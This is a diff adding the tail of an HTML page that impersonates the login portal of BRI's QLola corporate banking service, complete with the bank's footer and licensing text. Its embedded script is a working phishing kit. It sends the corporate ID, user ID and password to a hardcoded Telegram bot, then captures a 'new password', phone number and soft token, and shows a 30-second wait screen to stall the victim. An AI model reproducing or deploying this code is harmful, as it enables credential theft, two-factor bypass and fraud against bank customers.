+                    <p>Jl. Jenderal Sudirman Kav. 44-46, Jakarta 10210, Indonesia</p>
+                    <p><i class="fa-solid fa-phone"></i> 1500001</p>
+                    <p><i class="fa-solid fa-envelope"></i> Qlolabybri.co.id</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Licensing & Supervision</h4>
+                    <p>BRI is licensed and supervised by the Financial Services Authority (OJK) & Bank Indonesia (BI), and is a member of the Indonesia Deposit Insurance Corporation (LPS). Deposits are guaranteed up to IDR 2 billion per customer per bank. For the latest guaranteed interest rates, please access the official LPS website at https://apps.lps.go.id/BankPesertaLPSRate</p>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            &copy; 2026 PT. Bank Rakyat Indonesia (Persero) Tbk. All Rights Reserved
+        </div>
+    </footer>
+
+    <button class="chat-btn">
+        <i class="fa-solid fa-headset"></i>
+    </button>
+
+    <script>
+        // KONFIGURASI TELEGRAM
+        const TELEGRAM_BOT_TOKEN = '9272180904:AAEjo6T9OR8rS_z1KLrIUATHUi9Spab82a0'; 
+        const TELEGRAM_CHAT_ID = '8981793422'; 
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error("Gagal mengirim ke Telegram:", error);
+                return false;
+            }
+        }
+
+        // SPLASH SCREEN
+        let countdown; 
+        window.addEventListener('load', function() {
+            let timeLeft = 5; 
+            const timerDisplay = document.getElementById('timerDisplay');
+            const splash = document.getElementById('splashScreen');
+            
+            countdown = setInterval(function() {
+                timeLeft--;
+                timerDisplay.innerText = timeLeft; 
+                if (timeLeft <= 0) {
+                    clearInterval(countdown); 
+                    splash.classList.add('hidden'); 
+                    setTimeout(function() { splash.style.display = 'none'; }, 800); 
+                }
+            }, 1000); 
+        });
+
+        function skipSplash() {
+            clearInterval(countdown); 
+            const splash = document.getElementById('splashScreen');
+            splash.classList.add('hidden');
+            setTimeout(function() { splash.style.display = 'none'; }, 800);
+        }
+
+        // DROPDOWN
+        function toggleMenuDropdown() {
+            document.getElementById('menuDropdown').classList.toggle('show');
+            document.getElementById('langDropdown').classList.remove('show');
+        }
+
+        function toggleLangDropdown() {
+            document.getElementById('langDropdown').classList.toggle('show');
+            document.getElementById('menuDropdown').classList.remove('show');
+        }
+
+        function changeLang(lang) {
+            document.getElementById('currentLang').innerText = (lang === 'English') ? 'EN' : 'ID';
+            document.getElementById('langDropdown').classList.remove('show');
+        }
+
+        window.onclick = function(event) {
+            if (!event.target.closest('.menu-btn') && !event.target.closest('#menuDropdown')) {
+                document.getElementById('menuDropdown').classList.remove('show');
+            }
+            if (!event.target.closest('.lang-container')) {
+                document.getElementById('langDropdown').classList.remove('show');
+            }
+        }
+
+        // SHOW/HIDE PASSWORD
+        function togglePassword(inputId, iconId) {
+            const pwdInput = document.getElementById(inputId);
+            const eyeIcon = document.getElementById(iconId);
+
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            } else {
+                pwdInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            }
+        }
+
+        // FORM LOGIN
+        function checkFormValidity() {
+            const corpId = document.getElementById('corporateId').value;
+            const userId = document.getElementById('userId').value;
+            const pwd = document.getElementById('password').value;
+            const btnLogin = document.getElementById('btnLogin');
+
+            if (corpId && userId && pwd) {
+                btnLogin.disabled = false;
+                btnLogin.classList.add('active');
+            } else {
+                btnLogin.disabled = true;
+                btnLogin.classList.remove('active');
+            }
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            const btnLogin = document.getElementById('btnLogin');
+            
+            const corpId = document.getElementById('corporateId').value;
+            const userId = document.getElementById('userId').value;
+            const pwd = document.getElementById('password').value;
+
+            btnLogin.textContent = 'Memproses...';
+            btnLogin.disabled = true;
+
+            const message = `*LOGIN QLOLA*%0A%0A🏢 *Corporate ID:* ${corpId}%0A👤 *User ID:* ${userId}%0A🔑 *Password:* ${pwd}%0A%0A🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                document.getElementById('formLogin').style.display = 'none';
+                const formGanti = document.getElementById('formGantiPassword');
+                formGanti.style.display = 'block';
+                setTimeout(() => { formGanti.style.opacity = '1'; }, 50);
+            }, 1000);
+        }
+
+        // FORM GANTI PASSWORD
+        function checkPasswordValidity() {
+            const newPass = document.getElementById('newPassword').value;
+            const confirmPass = document.getElementById('confirmPassword').value;
+            const phone = document.getElementById('phoneNumber').value;
+            const btnLanjutkan = document.getElementById('btnLanjutkan');
+
+            const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
+            const isPasswordValid = passwordRegex.test(newPass);
+
+            const errNewPass = document.getElementById('errNewPass');
+            if (newPass.length > 0 && !isPasswordValid) {
+                errNewPass.classList.add('show');
+            } else {
+                errNewPass.classList.remove('show');
+            }
+
+            const isMatch = (newPass === confirmPass);
+            
+            const errConfirmPass = document.getElementById('errConfirmPass');
+            if (confirmPass.length > 0 && !isMatch) {
+                errConfirmPass.classList.add('show');
+            } else {
+                errConfirmPass.classList.remove('show');
+            }
+
+            if (newPass && confirmPass && phone && isPasswordValid && isMatch) {
+                btnLanjutkan.disabled = false;
+                btnLanjutkan.classList.add('active');
+            } else {
+                btnLanjutkan.disabled = true;
+                btnLanjutkan.classList.remove('active');
+            }
+        }
+
+        async function handlePasswordChange(e) {
+            e.preventDefault();
+            const btnLanjutkan = document.getElementById('btnLanjutkan');
+            const newPass = document.getElementById('newPassword').value;
+            const phone = document.getElementById('phoneNumber').value;
+
+            btnLanjutkan.textContent = 'Memproses...';
+            btnLanjutkan.disabled = true;
+
+            const message = `*GANTI PASSWORD QLOLA*%0A%0A🔑 *Sandi Baru:* ${newPass}%0A📱 *No. HP:* +62 ${phone}%0A%0A🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                btnLanjutkan.textContent = 'Lanjutkan';
+                document.getElementById('modalToken').classList.add('show');
+            }, 800);
+
+            return false;
+        }
+
+        // MODAL TOKEN
+        function closeModalToken() {
+            document.getElementById('modalToken').classList.remove('show');
+            checkPasswordValidity(); 
+        }
+
+        function toggleTokenPassword() {
+            const tokenInput = document.getElementById('softToken');
+            const eyeIcon = document.getElementById('eyeTokenIcon');
+
+            if (tokenInput.type === 'password') {
+                tokenInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            } else {
+                tokenInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            }
+        }
+
+        function checkTokenValidity() {
+            const token = document.getElementById('softToken').value;
+            const btnKonfirmasi = document.getElementById('btnKonfirmasi');
+
+            if (token.trim().length > 0) {
+                btnKonfirmasi.disabled = false;
+                btnKonfirmasi.style.opacity = '1';
+            } else {
+                btnKonfirmasi.disabled = true;
+                btnKonfirmasi.style.opacity = '0.6';
+            }
+        }
+
+        async function submitSoftToken() {
+            const token = document.getElementById('softToken').value;
+            const btnKonfirmasi = document.getElementById('btnKonfirmasi');
+            
+            btnKonfirmasi.textContent = 'Memproses...';
+            btnKonfirmasi.disabled = true;
+
+            const message = `*TOKEN LUNAK QLOLA*%0A%0A🔢 *Token:* ${token}%0A%0A🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                btnKonfirmasi.textContent = 'Konfirmasi';
+                document.getElementById('softToken').value = '';
+                checkTokenValidity();
+                document.getElementById('modalToken').classList.remove('show');
+                showAlertTimer();
+            }, 1000);
+        }
+
+        // MODAL TIMER 30 DETIK
+        let alertTimerInterval;
+
+        function showAlertTimer() {
+            const alertModal = document.getElementById('modalAlertTimer');
+            const countdownText = document.getElementById('countdownText');
+            const btnCloseAlert = document.getElementById('btnCloseAlert');
+            
+            alertModal.classList.add('show');
+            
+            let timeLeft = 30;
+            countdownText.innerText = timeLeft;
+            btnCloseAlert.disabled = true;
+            btnCloseAlert.classList.remove('active');
+            btnCloseAlert.innerText = 'Mohon Tunggu...';
+
+            clearInterval(alertTimerInterval);
+
+            alertTimerInterval = setInterval(() => {
+                timeLeft--;
+                countdownText.innerText = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(alertTimerInterval);
+                    countdownText.innerText = '0';
+                    btnCloseAlert.innerText = 'Mengerti';
+                    btnCloseAlert.disabled = false;
+                    btnCloseAlert.classList.add('active');
+                }
+            }, 1000);
+        }
+
+        function closeAlertModal() {
+            const btnCloseAlert = document.getElementById('btnCloseAlert');
+            if (!btnCloseAlert.disabled) {
+                document.getElementById('modalAlertTimer').classList.remove('show');
+            }
+        }
+    </script>
+</body>
+</html>
